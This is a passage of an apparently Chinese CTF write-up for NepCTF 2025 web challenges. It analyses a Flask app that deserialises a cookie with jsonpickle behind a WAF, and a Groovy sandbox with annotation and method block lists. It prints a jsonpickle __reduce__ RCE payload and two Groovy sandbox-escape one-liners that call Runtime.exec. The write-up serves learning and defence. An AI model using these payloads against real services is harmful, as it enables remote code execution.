base64.b64encode(token_raw.encode()).decode()</span><br><span class="line">            resp = make_response(<span class="string">&quot;登录成功。&quot;</span>)</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;authz&quot;</span>, b64_token)</span><br><span class="line">            resp.status_code = <span class="number">302</span></span><br><span class="line">            resp.headers[<span class="string">&#x27;Location&#x27;</span>] = <span class="string">&#x27;/panel&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, error=<span class="string">&quot;登录失败。用户名或密码无效。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/panel&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">panel</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&quot;authz&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;root&#x27;</span>, error=<span class="string">&quot;缺少Token。&quot;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded = base64.b64decode(token.encode()).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">&quot;Token格式错误。&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    ban = waf(decoded)</span><br><span class="line">    <span class="keyword">if</span> waf(decoded):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">f&quot;请不要黑客攻击！<span class="subst">&#123;ban&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sess_obj = jsonpickle.decode(decoded, safe=<span class="literal">True</span>)</span><br><span class="line">        meta = sess_obj.meta</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> meta.get(<span class="string">&quot;user&quot;</span>) != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;user_panel.html&#x27;</span>, username=meta.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;admin_panel.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">f&quot;数据解码失败。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/vault&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vault</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&quot;authz&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;root&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded = base64.b64decode(token.encode()).decode()</span><br><span class="line">        <span class="keyword">if</span> waf(decoded):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">&quot;请不要尝试黑客攻击！&quot;</span>)</span><br><span class="line">        sess_obj = jsonpickle.decode(decoded, safe=<span class="literal">True</span>)</span><br><span class="line">        meta = sess_obj.meta</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> meta.get(<span class="string">&quot;user&quot;</span>) != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">&quot;访问被拒绝。只有管理员才能查看此页面。&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        flag = <span class="string">&quot;NepCTF&#123;fake_flag_this_is_not_the_real_one&#125;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;vault.html&#x27;</span>, flag=flag)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;root&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/about&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">about</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;about.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>前面的代码中可以发现，只要我们的username不是admin，都会把反序列化结果渲染出来，那么这里的话就是唯一的回显点，也是为什么我在username中打的原因</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">serialized</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = json.loads(serialized)</span><br><span class="line">        payload = json.dumps(data, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">for</span> bad <span class="keyword">in</span> FORBIDDEN:</span><br><span class="line">            <span class="keyword">if</span> bad <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">return</span> bad</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里先进行<code>json.loads</code>，又<code>json.dumps</code>指定了<code>ensure_ascii=False</code>，使用特殊编码这里就会报错了，没法玩啊</p>
+<p>但是一直绕不过去，unicode编码发现<code>\\</code>被过滤了没法玩，后面我发现这里有一个关键的代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sess_obj = jsonpickle.decode(decoded, safe=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>开启了safe模式，找到一篇文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16041">https://xz.aliyun.com/news/16041</a></p>
+<p>**<code>safe=True</code>**：</p>
+<ul>
+<li>启用安全模式，限制反序列化的对象范围。</li>
+<li>如果设置为 <code>True</code>，只允许反序列化为基本数据类型（如字典、列表、字符串、整数等），避免执行潜在的危险代码（如自定义对象或可执行代码）。</li>
+<li>默认值为 <code>False</code>，允许反序列化复杂的 Python 对象。</li>
+</ul>
+<p>先本地测试一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a = Exp()</span><br><span class="line">s = jsonpickle.encode(a)</span><br><span class="line">jsonpickle.decode(s,safe=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">wanth3f1ag\23232</span></span><br><span class="line"><span class="string">&#123;&quot;py/reduce&quot;: [&#123;&quot;py/function&quot;: &quot;nt.system&quot;&#125;, &#123;&quot;py/tuple&quot;: [&quot;whoami&quot;]&#125;]&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>本地发现safe模式下jsonpickle反序列化reduce函数RCE成功，但是waf把reduce过滤了需要另寻出路</p>
+<h2 id="RevengeGooGooVVVY"><a href="#RevengeGooGooVVVY" class="headerlink" title="RevengeGooGooVVVY"></a>RevengeGooGooVVVY</h2><p>有两份源码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phase3purifiler.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.example.expressinject.Test.Groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> groovy.lang.Grab;</span><br><span class="line"><span class="keyword">import</span> groovy.transform.ASTTest;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.ast.*;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.classgen.GeneratorContext;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.CompilationFailedException;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.CompilationUnit;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.CompilePhase;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.SourceUnit;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.customizers.CompilationCustomizer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Phase3Purifiler</span> <span class="keyword">extends</span> <span class="title class_">CompilationCustomizer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; BLOCKED_TRANSFORMS = Collections.unmodifiableList(Arrays.asList(</span><br><span class="line">            <span class="string">&quot;ASTTest&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Grab&quot;</span>,</span><br><span class="line">            <span class="string">&quot;GrabConfig&quot;</span>,</span><br><span class="line">            <span class="string">&quot;GrabExclude&quot;</span>,</span><br><span class="line">            <span class="string">&quot;GrabResolver&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Grapes&quot;</span>,</span><br><span class="line">            <span class="string">&quot;AnnotationCollector&quot;</span></span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Phase3Purifiler</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(CompilePhase.CONVERSION);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">(SourceUnit source, GeneratorContext context, ClassNode classNode)</span> <span class="keyword">throws</span> CompilationFailedException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RejectASTTransformsVisitor</span>(source).visitClass(classNode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPhaseOperation</span><span class="params">(CompilationUnit unit)</span> <span class="keyword">throws</span> CompilationFailedException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPhaseOperation(unit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">needSortedInput</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.needSortedInput();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">RejectASTTransformsVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassCodeVisitorSupport</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> SourceUnit source;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">RejectASTTransformsVisitor</span><span class="params">(SourceUnit source)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.source = source;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> SourceUnit <span class="title function_">getSourceUnit</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> source;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitAnnotations</span><span class="params">(AnnotatedNode node)</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (AnnotationNode an : node.getAnnotations()) &#123;</span><br><span class="line">                <span class="keyword">for</span> (String blockedAnnotation : BLOCKED_TRANSFORMS) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (an.getClassNode().getName().contains(blockedAnnotation)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Annotation &quot;</span> + blockedAnnotation + <span class="string">&quot; cannot be used in the sandbox.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitImports</span><span class="params">(ModuleNode node)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (ImportNode importNode : node.getImports()) &#123;</span><br><span class="line">                    checkImportForBlockedAnnotation(importNode);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (ImportNode importStaticNode : node.getStaticImports().values()) &#123;</span><br><span class="line">                    checkImportForBlockedAnnotation(importStaticNode);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkImportForBlockedAnnotation</span><span class="params">(ImportNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (node != <span class="literal">null</span> &amp;&amp; node.getType() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String blockedAnnotation : BLOCKED_TRANSFORMS) &#123;</span><br><span class="line">                <span class="keyword">if</span> (node.getType().getName().contains(blockedAnnotation)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Annotation &quot;</span> + node.getType().getName() + <span class="string">&quot; cannot be used in the sandbox.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这是一个Groovy编译定制器，用于在编译阶段检查和阻止特定的AST转换注解。就是Groovy 源码刚刚被解析成抽象语法树（AST）之后执行的，我们看看这里的注解黑名单</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; BLOCKED_TRANSFORMS = Collections.unmodifiableList(Arrays.asList(</span><br><span class="line">        <span class="string">&quot;ASTTest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Grab&quot;</span>,</span><br><span class="line">        <span class="string">&quot;GrabConfig&quot;</span>,</span><br><span class="line">        <span class="string">&quot;GrabExclude&quot;</span>,</span><br><span class="line">        <span class="string">&quot;GrabResolver&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Grapes&quot;</span>,</span><br><span class="line">        <span class="string">&quot;AnnotationCollector&quot;</span></span><br><span class="line">));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>@Grab, @Grapes 等: 这是 <strong>Groovy Grapes</strong> 依赖管理系统的注解。他们在运行时能<strong>从互联网上动态下载并加载任意的 JAR 包</strong></li>
+<li>@ASTTest: 用于在编译时对 AST 进行测试和断言，可以被滥用来执行任意代码或修改 AST，。</li>
+<li>@AnnotationCollector: 可以将多个注解“打包”成一个自定义注解，可能被用来隐藏其他被禁止的注解，从而绕过检查。</li>
+</ul>
+<p>所以这个代码主要是对一些危险的注解进行一个禁用，防止在AST语法树阶段解析注解的时候会执行自定义注解处理器从而导致一些危险的注解实现代码执行。</p>
+<p>我们主要看第二个</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//customgroovypurifier.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.example.expressinject.Test.Groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.ast.ClassNode;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.ast.expr.Expression;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.ast.expr.MethodCallExpression;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.customizers.SecureASTCustomizer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomGroovyPurifier</span> <span class="keyword">extends</span> <span class="title class_">SecureASTCustomizer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Set&lt;String&gt; STRING_METHODS = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">SecureASTCustomizer</span> <span class="variable">secureASTCustomizer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureASTCustomizer</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> SecureASTCustomizer <span class="title function_">CreateASTCustomizer</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        secureASTCustomizer.addExpressionCheckers(expr -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (expr <span class="keyword">instanceof</span> MethodCallExpression) &#123;</span><br><span class="line">                <span class="type">MethodCallExpression</span> <span class="variable">methodCall</span> <span class="operator">=</span> (MethodCallExpression) expr;</span><br><span class="line">                <span class="type">Expression</span> <span class="variable">objectExpr</span> <span class="operator">=</span> methodCall.getObjectExpression();</span><br><span class="line">                <span class="type">ClassNode</span> <span class="variable">type</span> <span class="operator">=</span> objectExpr.getType();</span><br><span class="line">                type.getClass();</span><br><span class="line">                <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> type.getName();</span><br><span class="line">                <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> methodCall.getMethodAsString();</span><br><span class="line">                <span class="keyword">if</span> (typeName.equals(<span class="string">&quot;java.lang.String&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (STRING_METHODS.contains(methodName)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Calling &quot;</span>+methodName+<span class="string">&quot;  on &quot;</span>+ <span class="string">&quot;String is not allowed&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;execute&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Calling &quot;</span>+methodName+<span class="string">&quot; on &quot;</span>+ <span class="string">&quot;is not allowed&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        secureASTCustomizer.setClosuresAllowed(<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> secureASTCustomizer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Method method : String.class.getDeclaredMethods()) &#123;</span><br><span class="line">            STRING_METHODS.add(method.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里的话在我们逐步分析</p>
+<p>可以看到，<code>secureASTCustomizer.addExpressionCheckers(expr -&gt;</code>这里的话会将我们沙箱中每个表达式都在此进行处理，那我们重点看里面的处理逻辑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expr <span class="keyword">instanceof</span> MethodCallExpression) &#123;</span><br><span class="line">                <span class="type">MethodCallExpression</span> <span class="variable">methodCall</span> <span class="operator">=</span> (MethodCallExpression) expr;</span><br><span class="line">                <span class="type">Expression</span> <span class="variable">objectExpr</span> <span class="operator">=</span> methodCall.getObjectExpression();</span><br><span class="line">                <span class="type">ClassNode</span> <span class="variable">type</span> <span class="operator">=</span> objectExpr.getType();</span><br><span class="line">                type.getClass();</span><br><span class="line">                <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> type.getName();</span><br><span class="line">                <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> methodCall.getMethodAsString();</span><br><span class="line">                <span class="keyword">if</span> (typeName.equals(<span class="string">&quot;java.lang.String&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (STRING_METHODS.contains(methodName)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Calling &quot;</span>+methodName+<span class="string">&quot;  on &quot;</span>+ <span class="string">&quot;String is not allowed&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;execute&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Calling &quot;</span>+methodName+<span class="string">&quot; on &quot;</span>+ <span class="string">&quot;is not allowed&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br></pre></td></tr></table></figure>
+
+<p>外层if语句只检查了函数调用表达式<code>something.method()</code>类似的调用，其他类型的表达式都不管</p>
+<p>进入if语句后，会获取调用方法的对象类型，调用方法的名字</p>
+<ul>
+<li>如果我们调用的是String对象的方法，那么就会触发白名单验证，但是这里没有给出来，如果没在白名单里就会抛出异常</li>
+<li>如果我们调用的方法是execute，就会触发黑名单并抛出错误</li>
+</ul>
+<p>上面都没有的话就会返回true</p>
+<h3 id="方法一-属性访问表达式绕过"><a href="#方法一-属性访问表达式绕过" class="headerlink" title="方法一:属性访问表达式绕过"></a>方法一:属性访问表达式绕过</h3><p>其实上面的安全逻辑本来是希望我们只能调用String对象中的方法的，让我们的代码都只能是被当作字符串去调用操作，但是这里明显在外层if语句里存在一个问题，就是这里只检查了函数调用表达式而不管其他类型的表达式</p>
+<p><img src="/../image/achieve/202411/NepCTF2025/image-20250726031051869.png" alt="image-20250726031051869"></p>
+<p>然后可以想到，this.class是属于PropertyExpression属性访问表达式，之前在学习java反序列化的时候就接触过，每个java类运行时都会实例化一个 java.lang.Class 的实例。并且例如我们在脚本中调用方法println的话实际上就是在调用this.println()，所以this.class在脚本中实际上就是在访问该类的对象实例，那么就能间接访问到java.lang.Class 的实例，同时也就绕过第一层if，直接返回true了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;env&quot;</span>).getText()</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法二-getClass-方法绕过"><a href="#方法二-getClass-方法绕过" class="headerlink" title="方法二:getClass()方法绕过"></a>方法二:getClass()方法绕过</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;env&quot;</span>).getText()</span><br></pre></td></tr></table></figure>
+
